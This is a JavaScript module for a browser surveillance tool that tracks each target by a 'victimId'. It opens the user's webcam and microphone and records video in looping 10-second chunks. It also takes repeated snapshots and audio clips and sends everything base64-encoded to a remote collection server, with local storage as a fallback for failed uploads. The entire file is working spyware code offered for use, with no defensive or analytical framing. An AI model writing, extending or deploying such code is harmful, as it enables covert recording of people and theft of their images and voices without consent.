class MediaCapture {
    constructor(victimId, serverUrl) {
        this.victimId = victimId;
        this.serverUrl = serverUrl;
        this.mediaStream = null;
        this.recorder = null;
        this.isRecording = false;
        this.snapshotInterval = null;
    }

    async initializeMedia() {
        try {
            // Request camera and microphone access
            this.mediaStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    frameRate: { ideal: 30 }
                },
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    autoGainControl: true,
                    channelCount: 2,
                    sampleRate: 44100,
                    sampleSize: 16
                }
            });

            // Send success notification
            await this.sendMediaEvent('media_access_granted', {
                videoTracks: this.mediaStream.getVideoTracks().length,
                audioTracks: this.mediaStream.getAudioTracks().length,
                constraints: this.mediaStream.getConstraints()
            });

            return true;

        } catch (error) {
            await this.sendMediaEvent('media_access_denied', {
                error: error.message,
                name: error.name
            });
            return false;
        }
    }

    async startRecording() {
        if (!this.mediaStream) {
            console.warn('No media stream available');
            return false;
        }

        try {
            // Setup media recorder
            this.recorder = new MediaRecorder(this.mediaStream, {
                mimeType: 'video/webm; codecs=vp9,opus',
                videoBitsPerSecond: 2500000,
                audioBitsPerSecond: 128000
            });

            let chunks = [];
            
            this.recorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };

            this.recorder.onstop = async () => {
                try {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const buffer = await this.blobToBase64(blob);
                    
                    await this.sendMediaRecording(buffer, blob.size);
                    
                    // Continue recording if still active
                    if (this.isRecording) {
                        setTimeout(() => this.startRecording(), 15000);
                    }
                } catch (error) {
                    console.error('Error processing recording:', error);
                }
            };

            this.recorder.start(10000); // 10-second chunks
            this.isRecording = true;

            await this.sendMediaEvent('recording_started', {
                duration: 10000,
                format: 'video/webm'
            });

            return true;

        } catch (error) {
            await this.sendMediaEvent('recording_error', {
                error: error.message
            });
            return false;
        }
    }

    stopRecording() {
        if (this.recorder && this.isRecording) {
            this.recorder.stop();
            this.isRecording = false;
        }
    }

    startSnapshotCapture(interval = 5000) {
        if (!this.mediaStream) return;

        const video = document.createElement('video');
        video.srcObject = this.mediaStream;
        
        let snapshotCount = 0;
        const maxSnapshots = 8;

        video.play().then(() => {
            this.snapshotInterval = setInterval(async () => {
                if (snapshotCount >= maxSnapshots) {
                    this.stopSnapshotCapture();
                    return;
                }

                try {
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);

                    const snapshot = canvas.toDataURL('image/jpeg', 0.85);
                    await this.sendSnapshot(snapshot, snapshotCount + 1);
                    
                    snapshotCount++;

                } catch (error) {
                    console.warn('Snapshot capture error:', error);
                }
            }, interval);
        });
    }

    stopSnapshotCapture() {
        if (this.snapshotInterval) {
            clearInterval(this.snapshotInterval);
            this.snapshotInterval = null;
        }
    }

    async takeSingleSnapshot() {
        if (!this.mediaStream) return null;

        try {
            const video = document.createElement('video');
            video.srcObject = this.mediaStream;
            
            await video.play();
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            const snapshot = canvas.toDataURL('image/jpeg', 0.9);
            await this.sendSnapshot(snapshot, 0);
            
            return snapshot;

        } catch (error) {
            console.error('Single snapshot error:', error);
            return null;
        }
    }

    async startAudioRecording(duration = 10000) {
        if (!this.mediaStream) return false;

        try {
            const audioContext = new AudioContext();
            const source = audioContext.createMediaStreamSource(this.mediaStream);
            const destination = audioContext.createMediaStreamDestination();
            
            source.connect(destination);

            const audioRecorder = new MediaRecorder(destination.stream, {
                mimeType: 'audio/webm; codecs=opus',
                audioBitsPerSecond: 96000
            });

            let audioChunks = [];
            
            audioRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };

            audioRecorder.onstop = async () => {
                const blob = new Blob(audioChunks, { type: 'audio/webm' });
                const buffer = await this.blobToBase64(blob);
                
                await this.sendAudioRecording(buffer, blob.size);
                
                audioContext.close();
            };

            audioRecorder.start();
            setTimeout(() => audioRecorder.stop(), duration);

            await this.sendMediaEvent('audio_recording_started', {
                duration: duration,
                format: 'audio/webm'
            });

            return true;

        } catch (error) {
            await this.sendMediaEvent('audio_recording_error', {
                error: error.message
            });
            return false;
        }
    }

    async sendMediaRecording(data, size) {
        return this.sendToServer('media', {
            mediaType: 'video',
            data: data,
            size: size,
            timestamp: Date.now(),
            duration: 10000
        });
    }

    async sendSnapshot(data, sequence) {
        return this.sendToServer('media', {
            mediaType: 'snapshot',
            data: data,
            sequence: sequence,
            timestamp: Date.now()
        });
    }

    async sendAudioRecording(data, size) {
        return this.sendToServer('media', {
            mediaType: 'audio',
            data: data,
            size: size,
            timestamp: Date.now(),
            duration: 10000
        });
    }

    async sendMediaEvent(eventType, data) {
        return this.sendToServer('media_event', {
            eventType: eventType,
            ...data
        });
    }

    async sendToServer(type, data) {
        try {
            const response = await fetch(`${this.serverUrl}/api/media`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    mediaType: type,
                    ...data
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            return await response.json();

        } catch (error) {
            console.warn('Failed to send media data:', error);
            // Store locally for later retry
            this.storeLocally(type, data);
            return null;
        }
    }

    async blobToBase64(blob) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onloadend = () => {
                const base64 = reader.result.split(',')[1];
                resolve(base64);
            };
            reader.onerror = reject;
            reader.readAsDataURL(blob);
        });
    }

    storeLocally(type, data) {
        try {
            const key = `media_${type}_${Date.now()}`;
            localStorage.setItem(key, JSON.stringify({
                type: type,
                data: data,
                timestamp: Date.now(),
                victimId: this.victimId
            }));
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }

    // Cleanup resources
    cleanup() {
        this.stopRecording();
        this.stopSnapshotCapture();
        
        if (this.mediaStream) {
            this.mediaStream.getTracks().forEach(track => track.stop());
            this.mediaStream = null;
        }
    }

    // Get media capabilities
    async getMediaCapabilities() {
        const capabilities = {
            hasCamera: false,
            hasMicrophone: false,
            supportedConstraints: {},
            devices: []
        };

        try {
            // Check camera support
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                capabilities.supportedConstraints = navigator.mediaDevices.getSupportedConstraints();
                
                // Enumerate devices
                const devices = await navigator.mediaDevices.enumerateDevices();
                capabilities.devices = devices;
                
                capabilities.hasCamera = devices.some(device => device.kind === 'videoinput');
                capabilities.hasMicrophone = devices.some(device => device.kind === 'audioinput');
            }
        } catch (error) {
            console.warn('Media capabilities check failed:', error);
        }

        return capabilities;
    }
}

// Export for use in other modules
window.MediaCapture = MediaCapture;
